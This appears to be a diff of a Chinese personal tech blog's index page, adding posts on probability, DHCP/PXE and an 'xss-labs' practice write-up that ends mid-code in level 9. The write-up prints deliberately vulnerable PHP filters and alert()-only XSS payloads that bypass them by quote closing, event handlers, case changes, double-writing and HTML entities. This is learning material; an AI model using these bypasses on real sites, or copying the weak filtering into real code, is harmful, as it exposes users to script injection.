@@ -7,7 +7,282 @@
     error: 'Copy error',
     noSupport: 'The browser does not support'
   }
-} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">George</div><div class="author-info__description text-center">Here recording my growth of technology and hope you can gain something here.</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">87</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">19</span></a></div></div></div><nav id="nav" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">A.</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="site-info"><div id="site-title">A.</div><div id="site-sub-title">Welcome to my blog.</div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2021/01/31/exp%E6%94%B6%E9%9B%86/">exp收集</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-01-31</time><div class="content"><h2 id="PHP-7-0-7-3-disable-functions-bypass"><a href="#PHP-7-0-7-3-disable-functions-bypass" class="headerlink" title="PHP 7.0-7.3 disable_functions bypass"></a>PHP 7.0-7.3 disable_functions bypass</h2><h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><ul>
+} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">George</div><div class="author-info__description text-center">Here recording my growth of technology and hope you can gain something here.</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">92</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">19</span></a></div></div></div><nav id="nav" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">A.</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="site-info"><div id="site-title">A.</div><div id="site-sub-title">Welcome to my blog.</div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/02/%E6%A6%82%E7%8E%87%E8%AE%BA/">概率论</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-02</time><div class="content"><h1 id="随机事件及其概率"><a href="#随机事件及其概率" class="headerlink" title="随机事件及其概率"></a>随机事件及其概率</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>样本空间（S）：实验E所有可能结果组成的集合<br>样本点：E的每个结果</p>
+<p>随机事件（简称事件）：样本空间S的子集为E的随机事件<br>基本事件：由一个样本点组成的单点集</p>
+<h2 id="事件间的关系"><a href="#事件间的关系" class="headerlink" title="事件间的关系"></a>事件间的关系</h2><p>事件B<strong>包含</strong>事件A：事件A发生必然导致事件B发生</p>
+<p>A包含B且B包含A：A和B<strong>相等</strong></p>
+<p>A和B的<strong>和事件</strong>：当且仅当A、B中至少有一个发生</p>
+<p>A和B的<strong>积事件</strong>：当且仅当A、B都发生的时候</p>
+<p>B-A（B和A的<strong>差事件</strong>）：当且仅当B发生且A不发生时</p>
+<p>A∩B=空集：A和B是<strong>互斥、互不相容</strong>的</p>
+<p>A∪B=S且A∩B=空集：A和B互为<strong>对立事件（互斥事件）</strong></p>
+<p>德摩根定律：</p>
+<p><img src="https://bkimg.cdn.bcebos.com/formula/6b67bfad2cc2b10d0c4ab79acd198788.svg" alt="img"></p>
+<p><img src="https://bkimg.cdn.bcebos.com/formula/e30ab8539128e4bb9e6591efdc961624.svg" alt="img"></p>
+<blockquote>
+<p>注：概率论中，非的符号是在P、Q上画横线；并使∪，交是∩</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rn(A) &#x3D; fA&#x2F;n</span><br></pre></td></tr></table></figure>
+
+<p>Rn(A)为事件A在n次试验中发生的<strong>频率</strong></p>
+<h2 id="频率和概率的几条性质"><a href="#频率和概率的几条性质" class="headerlink" title="频率和概率的几条性质"></a>频率和概率的几条性质</h2><p>若A、B互不相容，则</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rn(A∪B)&#x3D;Rn(A)+Rn(B)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>若A属于B，则</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P(B-A)&#x3D;P(B)-P(A)</span><br><span class="line">P(B)&gt;&#x3D;P(A)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>加法公式：对于任意两事件A、B【AB就是A∩B】</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P(A∪B)&#x3D;P(A)+P(B)-P(AB)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>除此以外，还满足<strong>交换律</strong>、<strong>结合律</strong>、<strong>分配律</strong>和<strong>德摩根定律</strong></p>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/02/%E5%88%98%E8%B6%85%E7%9A%84%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/">刘超的网络协议</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-02</time><div class="content"><h2 id="DHCP协议"><a href="#DHCP协议" class="headerlink" title="DHCP协议"></a>DHCP协议</h2><h3 id="自动配置IP地址过程"><a href="#自动配置IP地址过程" class="headerlink" title="自动配置IP地址过程"></a>自动配置IP地址过程</h3><h4 id="DHCP-Discover："><a href="#DHCP-Discover：" class="headerlink" title="DHCP Discover："></a>DHCP Discover：</h4><p>新来的机器发广播包（广播包封装了 UDP，UDP 封装了 BOOTP。其实 DHCP 是 BOOTP 的增强版，但是如果你去抓包的话，很可能看到的名称还是 <strong>BOOTP 协议</strong>。）<img src="/2021/03/02/%E5%88%98%E8%B6%85%E7%9A%84%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/1-1.png" alt="1-1"></p>
+<h4 id="DHCP-Offer："><a href="#DHCP-Offer：" class="headerlink" title="DHCP Offer："></a>DHCP Offer：</h4><p>DHCP Server提供给新来的机器一个IP地址；同时，DHCP Server 为此客户保留为它提供的 IP 地址，从而不会为其他 DHCP 客户分配此 IP 地址。（这里，DHCP Server之所以知道它是新来的机器，靠的是它的MAC地址，这就是<strong>MAC地址唯一</strong>的重要性了）</p>
+<p><img src="/2021/03/02/%E5%88%98%E8%B6%85%E7%9A%84%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/1-2.png" alt="1-2"></p>
+<h4 id="DHCP-Request："><a href="#DHCP-Request：" class="headerlink" title="DHCP Request："></a>DHCP Request：</h4><p>如果有多个DHCP服务器，新的机器会选择其中一个 DHCP Offer，一般是最先到达的那个，并且会向网络发送一个 DHCP Request 广播数据包。<img src="/2021/03/02/%E5%88%98%E8%B6%85%E7%9A%84%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/1-3.png" alt="1-3"></p>
+<h4 id="DHCP-ACK"><a href="#DHCP-ACK" class="headerlink" title="DHCP ACK:"></a>DHCP ACK:</h4><p>当 DHCP Server 接收到客户机的 DHCP request 之后，会广播返回给客户机一个 DHCP ACK 消息包，表明已经接受客户机的选择，并将这一 IP 地址的合法租用信息和其他的配置信息都放入该广播包，发给客户机，欢迎它加入网络大家庭。<img src="/2021/03/02/%E5%88%98%E8%B6%85%E7%9A%84%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/1-4.png" alt="1-4"></p>
+<h3 id="预启动执行环境（PXE）"><a href="#预启动执行环境（PXE）" class="headerlink" title="预启动执行环境（PXE）"></a>预启动执行环境（PXE）</h3><ol>
+<li><p>首先，启动 BIOS，读取硬盘的 MBR 启动扇区，将 GRUB 启动起来</p>
+</li>
+<li><p>然后将权力交给 GRUB，GRUB 加载内核、加载作为根文件系统的 initramfs 文件</p>
+</li>
+<li><p>然后将权力交给内核</p>
+</li>
+<li><p>最后内核启动，初始化整个操作系统。</p>
+</li>
+</ol>
+<p>   启动BIOS后执行PXE过程</p>
+<p>   <img src="/2021/03/02/%E5%88%98%E8%B6%85%E7%9A%84%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/1-5.png" alt="1-5"></p>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/02/09/%E6%8A%A4%E7%BD%91%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/">护网学习资料</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-02-09</time><div class="content"></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/02/08/xss-labs/">xss-labs</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-02-08</time><div class="content"><h1 id="Pass1【无过滤】"><a href="#Pass1【无过滤】" class="headerlink" title="Pass1【无过滤】"></a>Pass1【无过滤】</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;</span><br><span class="line">?name&#x3D;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>字母要有//或者单双引号，数字可以省略</p>
+<h1 id="Pass2【-gt-闭合】"><a href="#Pass2【-gt-闭合】" class="headerlink" title="Pass2【&gt;闭合】"></a>Pass2【&gt;闭合】</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str.<span class="string">'"&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里echo处用了<code>htmlspecialchars()</code></p>
+<blockquote>
+<h2 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h2><p><code>htmlspecialchars()</code> 函数把预定义的字符转换为 HTML 实体。</p>
+<p>预定义的字符是：</p>
+<ul>
+<li>&amp; （和号）成为 &amp;</li>
+<li>“ （双引号）成为 “</li>
+<li>‘ （单引号）成为 ‘</li>
+<li>&lt; （小于）成为 &lt;</li>
+<li>&gt; （大于）成为 &gt;</li>
+</ul>
+<p>实体的意思是仅作显示之用，没有特殊含义</p>
+<p>但是这个函数存在第二参数：</p>
+<p>可用的引号类型：</p>
+<ul>
+<li>ENT_COMPAT - 默认。仅编码双引号。</li>
+<li>ENT_QUOTES - 编码双引号和单引号。</li>
+<li>ENT_NOQUOTES - 不编码任何引号。</li>
+</ul>
+<p>也就是不设置第二参数的话，仅会过滤双引号，却放行了单引号</p>
+</blockquote>
+<p>所以只能在input处构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword&#x3D;ag&quot;&gt;&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>变成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;ag&quot;&gt;&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="Pass3【单引号闭合触发事件】"><a href="#Pass3【单引号闭合触发事件】" class="headerlink" title="Pass3【单引号闭合触发事件】"></a>Pass3【单引号闭合触发事件】</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">"&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value='"</span>.htmlspecialchars($str).<span class="string">"'&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现两边都htmlspecialchars()了，但是没有设置第二参数，且value是单引号包裹，所以可以单引号闭合。</p>
+<p>可以构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ag&#39; onmouseover&#x3D;&#39;alert(&#x2F;xss&#x2F;)</span><br></pre></td></tr></table></figure>
+
+<p>最后变成了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&#39;ag&#39; onmouseover&#x3D;&#39;alert(&#x2F;xss&#x2F;)&#39;&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="Pass4【双引号闭合触发事件】"><a href="#Pass4【双引号闭合触发事件】" class="headerlink" title="Pass4【双引号闭合触发事件】"></a>Pass4【双引号闭合触发事件】</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里过滤了尖括号，且value用双引号包裹，所以构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ag&quot; onmouseover&#x3D;&quot;alert(&#x2F;xss&#x2F;)</span><br></pre></td></tr></table></figure>
+
+<p>最后变成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;ag&quot; onmouseover&#x3D;&quot;alert(&#x2F;xss&#x2F;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="Pass5【javascript伪协议】"><a href="#Pass5【javascript伪协议】" class="headerlink" title="Pass5【javascript伪协议】"></a>Pass5【javascript伪协议】</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>过滤了script标签和触发事件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ag&quot;&gt;&lt;a href&#x3D;&quot;javascript:alert(&#x2F;xss&#x2F;)&quot;&gt;click&lt;&#x2F;a&gt;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>最终变成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;ag&quot;&gt;&lt;a href&#x3D;&quot;javascript:alert(&#x2F;xss&#x2F;)&quot;&gt;click&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="Pass6【大小写绕过】"><a href="#Pass6【大小写绕过】" class="headerlink" title="Pass6【大小写绕过】"></a>Pass6【大小写绕过】</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这关没有将keyword转小写，就有了漏洞，将上一关href变成大写即可绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ag&quot;&gt;&lt;a HREF&#x3D;&quot;javascript:alert(&#x2F;xss&#x2F;)&quot;&gt;click&lt;&#x2F;a&gt;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="Pass7【双写绕过】"><a href="#Pass7【双写绕过】" class="headerlink" title="Pass7【双写绕过】"></a>Pass7【双写绕过】</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$str =strtolower( $_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">""</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">""</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">""</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">""</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>还是利用Pass5的payload，双写一下即可【javascript里的script也要双写】</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ag&quot;&gt;&lt;a hrhrefef&#x3D;&quot;javascrscriptipt:alert(&#x2F;xss&#x2F;)&quot;&gt;click&lt;&#x2F;a&gt;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h1 id="Pass8【HTML字符实体绕过】"><a href="#Pass8【HTML字符实体绕过】" class="headerlink" title="Pass8【HTML字符实体绕过】"></a>Pass8【HTML字符实体绕过】</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str7).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这一关用到了实体字符绕过，先提供一个<a href="https://www.qqxiuzi.cn/bianma/zifushiti.php" target="_blank" rel="noopener">转化为实体字符的网站</a></p>
+<p>我们利用这句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href&#x3D;&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&#39;;</span><br></pre></td></tr></table></figure>
+
+<p>利用HTML字符实体构造【字符实体在后端显示为<code>&amp;#115;</code>，到了前端HTML页面转化为s，所以可以绕过后端】</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;cript:alert(&#x2F;xss&#x2F;)</span><br></pre></td></tr></table></figure>
+
+<p>但要记住，这个必须要在输入框输入提交，不能在hackbar提交。因为此时&amp;会被当初GET参数之间的分隔符。</p>
+<h1 id="Pass9【HTML字符实体绕过2】"><a href="#Pass9【HTML字符实体绕过2】" class="headerlink" title="Pass9【HTML字符实体绕过2】"></a>Pass9【HTML字符实体绕过2】</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">false</span>===strpos($str7,<span class="string">'http://'</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="您的链接不合法？有没有！"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str7).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到相比于Pass8，多了这块</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">false</span>===strpos($str7,<span class="string">'http://'</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="您的链接不合法？有没有！"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span 